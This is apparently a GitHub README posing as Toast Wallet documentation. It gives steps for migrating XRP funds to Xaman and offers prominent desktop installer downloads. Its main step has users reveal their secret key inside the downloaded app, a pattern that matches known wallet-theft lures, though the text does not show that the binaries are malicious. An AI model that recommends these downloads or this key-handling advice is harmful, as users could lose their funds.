<div align="center">

# How to Migrate From Toast Wallet to Xaman (XUMM) Safely

**A safe, step-by-step migration from Toast Wallet to Xaman (XUMM).**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **Only download from this GitHub release page or the [official Toast-Wallet GitHub org](https://github.com/Toast-Wallet).**
> toastwallet.com is currently unreachable, and `toastwallet.app` is a known phishing clone —
> see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

Xaman (the wallet formerly known as XUMM) is the most common destination for former Toast Wallet
users, and the migration is straightforward once you're actually into your old wallet.

**Before you start:** make sure you can already access your Toast Wallet and view your secret key.
If you're not there yet, follow our [full recovery guide](./how-to-recover-xrp-toast-wallet.md)
first — migration only works once recovery is complete.

**Step 1: Get your Toast Wallet secret key.** In your installed Toast Wallet app (the
[Windows](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe)
or [Mac](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg)
build), go to your wallet settings and reveal the secret key. It's a string starting with the
letter "s," roughly 29 characters long. You'll need your passphrase to reveal it.

**Step 2: Install Xaman.** Download it from the official app store listing or xaman.app — verify
you're getting the genuine app given how aggressively the "Toast Wallet" name has been
impersonated; the same caution applies to any wallet app.

**Step 3: Import using your secret key, not your recovery phrase.** This is the step people most
often get stuck on: Xaman's import flow asks for a secret/seed, and Toast Wallet's 6-word recovery
phrase is **not** the same thing and will not work here — see our
[terminology breakdown](./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md) if
you're unclear on the difference. Use the secret key from Step 1 instead.

**Step 4: Verify the imported address matches.** Before doing anything else, confirm the wallet
address shown in Xaman matches your original Toast Wallet address exactly. If it doesn't match,
stop and double-check you imported the correct secret key.

**Step 5: (Optional but recommended) Send everything to a brand-new Xaman-generated address.**
Rather than continuing to use the imported address indefinitely, some users prefer to generate a
fresh wallet within Xaman and transfer funds there, treating the imported Toast Wallet key as a
one-time migration step. This isn't required, but it cleanly separates your XRP Ledger history
going forward from the old Toast Wallet-era address.

**Never enter your Toast Wallet secret key anywhere except the official Xaman app or the genuine
Toast Wallet desktop app itself.** See our
[scam warning list](./toast-wallet-scam-warning-list.md) for the sites and apps to avoid during
this process.

---

## ⚠️ Known Scams — Do Not Use These

- **The fake "Toast Plus" wallet app** — not affiliated with Toast Wallet, tied to over **$5M in stolen XRP** and a class-action lawsuit against Apple. See: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing clone** — mimics the real recovery page to steal imported wallets. See: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **SEO clone sites impersonating Toast Wallet** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`.
- **Follow-up "recovery for a fee" scams** targeting people who already lost funds — never legitimate.

Complete list: [Toast Wallet Scam Alert: Full Warning List](./toast-wallet-scam-warning-list.md). To report a scam, visit [ic3.gov](https://www.ic3.gov).

## Related Articles

- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
- [Passphrase vs Recovery Phrase vs Backup Code vs Secret Key](./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md)
- [Toast Wallet Alternatives](./toast-wallet-alternatives.md)
